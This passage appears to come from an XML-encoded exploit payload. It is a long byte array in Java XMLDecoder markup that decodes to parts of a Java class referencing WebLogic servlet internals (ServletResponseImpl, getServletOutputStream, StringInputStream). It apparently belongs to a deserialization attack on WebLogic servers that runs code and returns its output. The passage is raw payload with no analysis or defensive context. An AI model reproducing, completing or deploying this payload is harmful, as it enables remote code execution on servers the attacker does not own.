&lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4851"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4852"&gt; &lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="4853"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4854"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4855"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="4856"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4857"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4858"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4859"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4860"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4862"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="4863"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="4864"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="4865"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="4866"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="4867"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4868"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="4869"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4870"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4871"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4872"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4873"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4874"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4875"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4876"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4877"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4878"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="4879"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4880"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4881"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4882"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4883"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4884"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4885"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4886"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4887"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4888"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4889"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4890"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4891"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4892"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="4893"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4894"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4895"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="4896"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4897"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4898"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4899"&gt; &lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="4900"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4901"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4902"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="4903"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4904"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4905"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4906"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4907"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="4908"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="4909"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="4910"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4911"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="4912"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="4914"&gt; &lt;byte&gt;104&lt;/byte&gt;&lt;/void&gt;&lt;void index="4916"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4917"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="4919"&gt; &lt;byte&gt;55&lt;/byte&gt;&lt;/void&gt;&lt;void index="4921"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="4922"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4924"&gt; &lt;byte&gt;45&lt;/byte&gt;&lt;/void&gt;&lt;void index="4925"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="4926"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4927"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="4928"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4929"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4930"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4931"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4932"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="4933"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4934"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4935"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4936"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4937"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="4938"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4939"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4940"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4941"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4942"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="4943"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4944"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4945"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4946"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4947"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4948"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4949"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4950"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="4951"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="4952"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4953"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4954"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="4955"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4956"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4957"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4958"&gt; &lt;byte&gt;82&lt;/byte&gt;&lt;/void&gt;&lt;void index="4959"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4960"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4961"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="4962"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="4963"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="4964"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="4965"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4966"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="4967"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="4968"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="4969"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4970"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="4972"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4973"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="4975"&gt; &lt;byte&gt;22&lt;/byte&gt;&lt;/void&gt;&lt;void index="4976"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="4977"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4978"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4979"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="4980"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4981"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4982"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="4983"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="4984"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4985"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4986"&gt; &lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="4987"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="4988"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4989"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="4990"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="4991"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4992"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="4993"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="4994"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="4995"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="4996"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="4997"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="4998"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5000"&gt; &lt;byte&gt;53&lt;/byte&gt;&lt;/void&gt;&lt;void index="5001"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="5002"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="5003"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="5004"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="5005"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5006"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="5007"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5008"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5009"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5010"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5011"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="5012"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5013"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5014"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5015"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5016"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5017"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5018"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5019"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5020"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5021"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5022"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5023"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5024"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5025"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5026"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5027"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5028"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5029"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5030"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5031"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5032"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5033"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5034"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5035"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5036"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5037"&gt; &lt;byte&gt;79&lt;/byte&gt;&lt;/void&gt;&lt;void index="5038"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="5039"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5040"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="5041"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="5042"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5043"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5044"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5045"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5046"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5047"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5048"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="5049"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="5050"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="5051"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="5052"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5053"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="5054"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5056"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5058"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5059"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5061"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="5063"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="5064"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5066"&gt; &lt;byte&gt;35&lt;/byte&gt;&lt;/void&gt;&lt;void index="5067"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="5068"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5069"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="5070"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5071"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5072"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5073"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5074"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="5075"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5076"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="5077"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="5078"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5079"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5080"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="5081"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5082"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5083"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5084"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5085"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5086"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5087"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5088"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5089"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5090"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5091"&gt; &lt;byte&gt;73&lt;/byte&gt;&lt;/void&gt;&lt;void index="5092"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5093"&gt; &lt;byte&gt;112&lt;/byte&gt;&lt;/void&gt;&lt;void index="5094"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="5095"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5096"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5097"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5098"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5099"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5100"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5101"&gt; &lt;byte&gt;109&lt;/byte&gt;&lt;/void&gt;&lt;void index="5102"&gt; &lt;byte&gt;7&lt;/byte&gt;&lt;/void&gt;&lt;void index="5104"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5105"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5107"&gt; &lt;byte&gt;8&lt;/byte&gt;&lt;/void&gt;&lt;void index="5108"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5109"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5110"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5111"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5112"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5113"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5114"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5115"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5116"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5118"&gt; &lt;byte&gt;20&lt;/byte&gt;&lt;/void&gt;&lt;void index="5119"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="5120"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="5121"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="5122"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="5123"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5124"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5125"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5126"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5127"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5128"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5129"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5130"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5131"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5132"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5133"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5134"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5135"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5136"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5137"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5138"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="5139"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5141"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5143"&gt; &lt;byte&gt;117&lt;/byte&gt;&lt;/void&gt;&lt;void index="5144"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5146"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5148"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5149"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5151"&gt; &lt;byte&gt;21&lt;/byte&gt;&lt;/void&gt;&lt;void index="5152"&gt; &lt;byte&gt;40&lt;/byte&gt;&lt;/void&gt;&lt;void index="5153"&gt; &lt;byte&gt;76&lt;/byte&gt;&lt;/void&gt;&lt;void index="5154"&gt; &lt;byte&gt;106&lt;/byte&gt;&lt;/void&gt;&lt;void index="5155"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5156"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5157"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5158"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5159"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5160"&gt; &lt;byte&gt;97&lt;/byte&gt;&lt;/void&gt;&lt;void index="5161"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5162"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5163"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5164"&gt; &lt;byte&gt;83&lt;/byte&gt;&lt;/void&gt;&lt;void index="5165"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5166"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5167"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5168"&gt; &lt;byte&gt;110&lt;/byte&gt;&lt;/void&gt;&lt;void index="5169"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5170"&gt; &lt;byte&gt;59&lt;/byte&gt;&lt;/void&gt;&lt;void index="5171"&gt; &lt;byte&gt;41&lt;/byte&gt;&lt;/void&gt;&lt;void index="5172"&gt; &lt;byte&gt;86&lt;/byte&gt;&lt;/void&gt;&lt;void index="5173"&gt; &lt;byte&gt;12&lt;/byte&gt;&lt;/void&gt;&lt;void index="5175"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5177"&gt; &lt;byte&gt;120&lt;/byte&gt;&lt;/void&gt;&lt;void index="5178"&gt; &lt;byte&gt;10&lt;/byte&gt;&lt;/void&gt;&lt;void index="5180"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5182"&gt; &lt;byte&gt;121&lt;/byte&gt;&lt;/void&gt;&lt;void index="5183"&gt; &lt;byte&gt;1&lt;/byte&gt;&lt;/void&gt;&lt;void index="5185"&gt; &lt;byte&gt;49&lt;/byte&gt;&lt;/void&gt;&lt;void index="5186"&gt; &lt;byte&gt;119&lt;/byte&gt;&lt;/void&gt;&lt;void index="5187"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5188"&gt; &lt;byte&gt;98&lt;/byte&gt;&lt;/void&gt;&lt;void index="5189"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5190"&gt; &lt;byte&gt;111&lt;/byte&gt;&lt;/void&gt;&lt;void index="5191"&gt; &lt;byte&gt;103&lt;/byte&gt;&lt;/void&gt;&lt;void index="5192"&gt; &lt;byte&gt;105&lt;/byte&gt;&lt;/void&gt;&lt;void index="5193"&gt; &lt;byte&gt;99&lt;/byte&gt;&lt;/void&gt;&lt;void index="5194"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5195"&gt; &lt;byte&gt;115&lt;/byte&gt;&lt;/void&gt;&lt;void index="5196"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5197"&gt; &lt;byte&gt;114&lt;/byte&gt;&lt;/void&gt;&lt;void index="5198"&gt; &lt;byte&gt;118&lt;/byte&gt;&lt;/void&gt;&lt;void index="5199"&gt; &lt;byte&gt;108&lt;/byte&gt;&lt;/void&gt;&lt;void index="5200"&gt; &lt;byte&gt;101&lt;/byte&gt;&lt;/void&gt;&lt;void index="5201"&gt; &lt;byte&gt;116&lt;/byte&gt;&lt;/void&gt;&lt;void index="5202"&gt; &lt;byte&gt;47&lt;/byte&gt;&lt;/void&gt;&lt;void index="5203"&gt; 